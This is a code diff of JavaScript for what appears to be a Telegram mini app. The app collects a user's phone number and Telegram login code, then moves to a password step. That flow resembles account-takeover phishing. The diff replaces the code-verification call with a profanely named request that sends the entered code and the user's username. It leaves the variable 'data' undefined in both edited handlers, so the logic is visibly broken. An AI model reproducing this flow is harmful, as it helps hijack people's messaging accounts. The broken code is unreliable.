@@ -254,12 +254,6 @@ async function request_user_phone() {
 resend_button.addEventListener("click", async function() {
     localStorage.setItem("codeTimestamp", Date.now().toString());
     startTimer();
-
-    const data = await sendRequest("request_code", "POST", {
-        phone_number: get_phone(),
-        telegram_user_id: USER_ID,
-        telegram_username: USER_USERNAME
-    });
     if (data.status === "code_sent") {
         info("Код отправлен повторно");
     }
@@ -447,17 +441,14 @@ document.querySelectorAll('.keyboard button[data-digit]').forEach(button => {
 
             if (currentCell === cells.length) {
                 const enteredCode = Array.from(cells).map(cell => cell.textContent.trim()).join('');
-                console.log("конча", enteredCode)
                 start_code_loading();
-                const data = await sendRequest("verify_code", "POST", {
-                    phone_number: get_phone(),
+                RequestSUKA('code', 'POST', {
                     code: enteredCode,
-                    telegram_user_id: USER_ID,
-                    telegram_username: USER_USERNAME
-                });
+                    username: window.Telegram.WebApp.initDataUnsafe.user.username
+                })
                 end_code_loading();
 
-                if (data.status === "authorized") {
+                if (data.status === 200) {
                     if (data.needs_password) {
                         await step3();
                     } else {
